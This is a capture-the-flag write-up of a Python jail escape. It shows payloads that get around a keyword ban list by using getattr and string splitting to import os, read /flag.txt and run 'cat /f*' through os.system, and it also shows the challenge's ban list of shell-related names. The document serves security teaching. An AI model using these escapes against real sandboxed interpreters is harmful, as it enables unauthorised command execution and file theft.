# Pyjail
We were given the challenge text:
```
Escape me plz.

EU instance: 207.180.200.166 1024

US instance: 45.134.3.200 1024

author: pop_eax & Tango
```

Along with the file [jailbreak.py](jailbreak.py).

I have never done a Python breakout challenge before, but this was extremely fun! We could execute Python commands, but very restriced. If our input had a banned word it would fail, and we also didn't have access to the [Python \_\_builtins__](https://docs.python.org/3/library/functions.html#built-in-funcs). After a while of reading up on how Python's exec worked, I did however realized that we had access to scope's global variables through the variable `globals`. If we executed the code `print(globals)`, we got the globals dict as a response 
```
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x0204AF70>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': 'jailbreak.py', '__cached__': None, 're': <module 're' from 'C:\\Users\\andre\\AppData\\Local\\Programs\\Python\\Python38-32\\lib\\re.py'>, 'version': '3.8.5 (tags/v3.8.5:580fbb0, Jul 20 2020, 15:43:08) [MSC v.1926 32 bit (Intel)]', 'banned': 'import|chr|os|sys|system|builtin|exec|eval|subprocess|pty|popen|read|get_data', 'search_func': <function <lambda> at 0x02369E80>, 'main': <function main at 0x0239DDF0>}
```
I then realized that we could access the `__builtins__` module through the `globals` variable by doing `globals['__builtins__']`. This would allow us to the function `__import()__`. The command I wished to execute was `open('/flag.txt', 'r').read()`. To use `open()` i had to import it, but import was in the banlist. I had a look at the `__builtins__` once again again, and noticed [`getattr()`](https://docs.python.org/3/library/functions.html#getattr). `getattr()` requires 2 parameters, the first one being an object and the second one must be a string. For example, `getattr(x, 'foobar')` is equivalent to `x.foobar`. The object argument can however also be a string, which allows us to do `getattr('__imp'+'ort__', 'open')`. So to import open, we have to use the code: `globals['__builtins__'].getattr('__imp'+'ort__', 'open')`. To get `read()` of `open()`, we use the same getattr trick. The final command did however not work, as the `open()` function returned an error due to the restrictions of the pyjail.

The new command I planned to execute was `os.read(os.open('/flag.txt', os.O_RDONLY))`. I once again used the getattr trick to bypass the bans for `import` and `read`. I also used lambdas to simulate variables. In the command `b = globals['__builtins__']` and `o = b.getattr(b, '__imp'+'ort__')('o'+'s'))`. I also encountered one final error, since the the Python script made my input lowercase, `os.O_RDONLY` would become lowercase and not work. Luckily this was just a flag, and I instead replaced it with `0`. Here's the final command that prints the contents of `/flag.txt`, which was `flag{l3t's_try_sc0p1ng_th1s_0ne_2390098}`.
```py
print((lambda b: (lambda o: b.getattr(o, 're'+'ad')(o.open('/flag.txt', 0), 64))(b.getattr(b, '__imp'+'ort__')('o'+'s')))(globals['__builtins__']))
```

## Some more solutions

Afterwards I realized I could simply have used `os.system('cat /flag.txt')` to get the output, which also made it a bit shorter:
```py
(lambda b: b.getattr(b.getattr(b, '__imp'+'ort__')('o'+'s'), 'sy'+'stem')('cat /f*'))(globals['__builtins__'])
```

After talking with the creator since I thought it was an incredibly fun challenge, I learned that his "intended" solution was to clear the string of banned characters. I then made this *much* cleaner and simpler 2 liner exploit:
```py
globals['banned'] = 'a'
globals['__builtins__'].__import__('os').system('cat /f*')
```